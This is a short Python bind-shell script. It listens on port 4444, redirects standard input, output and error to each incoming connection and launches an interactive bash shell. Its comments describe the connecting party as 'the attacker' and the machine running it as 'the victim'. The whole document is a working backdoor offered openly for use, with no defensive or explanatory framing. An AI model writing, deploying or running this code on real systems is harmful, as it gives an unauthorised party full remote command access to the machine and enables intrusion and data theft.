#!/usr/bin/python

import socket
import os
import sys
import subprocess


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creating socket using socket python socket library

s.bind(('',4444)) # bind to port 4444
#s.bind(('',int(sys.argv[1]))) <-- same as above, but allows you to pass port as an argument to the script rather than being hardcoded

s.listen(10) # listen for connections made to socket

while 1: # infinite loop
    connection,address = s.accept() #accept connection, 'conection' variable is a socket object and 'address' is the address that connected to the victim running this script
    data = connection.recv(1024) # receive data from the attacker
    os.dup2(connection.fileno(),0) # duplicate stdin to the connection
    os.dup2(connection.fileno(),1) # duplicate stdout to the connection
    os.dup2(connection.fileno(),2) # duplicate stderr to the connection
    subprocess.call(['/bin/bash','-i']) # call /bin/bash in interactive mode
